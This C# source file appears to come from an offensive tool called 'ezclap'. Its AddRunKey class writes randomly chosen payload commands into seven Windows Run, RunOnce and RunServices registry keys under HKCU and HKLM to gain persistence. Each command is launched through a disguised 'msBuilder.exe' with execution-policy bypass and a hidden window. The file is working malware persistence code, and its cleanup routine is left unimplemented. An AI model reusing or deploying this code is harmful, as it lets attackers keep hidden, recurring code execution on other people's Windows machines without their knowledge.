using System;


/*  Name: AddRunKey 
 *  Description: Adds the payload in various RunKey registry location. 
 *  The RunKeys themselves are hardcoded in RegistryKeys.cs, as there are only 7 known 
 *  RunKey locations that can be used for persistence. 
 *  
 *  Params:
 *      - string[] name = Name of the registry key to be added into RunKey locations 
 *      - string payload = Payload string to be executed
 */
namespace ezclap
{
	public class AddRunKey
	{
		public AddRunKey (string[] names, string[] payloadArr)
		{
            Initialize(names, payloadArr);
		}
		public static void Initialize(string[] names, string[] payloadArr)
		{
            Random rnd = new Random();
            int rndNameIdx = rnd.Next(0, names.Length - 1);
            /*
             *  Description: Add RunKey registry key with payload  
             */

            //payload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)];

            Utils.setHKCUSubKey(RegistryKeys.RunKey, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
            Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);

            Utils.setHKLMSubKey(RegistryKeys.RunKey, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
            Utils.setHKLMSubKey(RegistryKeys.RunOnceKey, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
            Utils.setHKLMSubKey(RegistryKeys.RunServices, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
            Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
            Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
            
        } 

        public static void deleteKeys()
        {
            // TODO: Implement deleting runkeys 
            // Open up registry keys and see if there are names of the key. If name found, delete the key. 
        }

	}
}
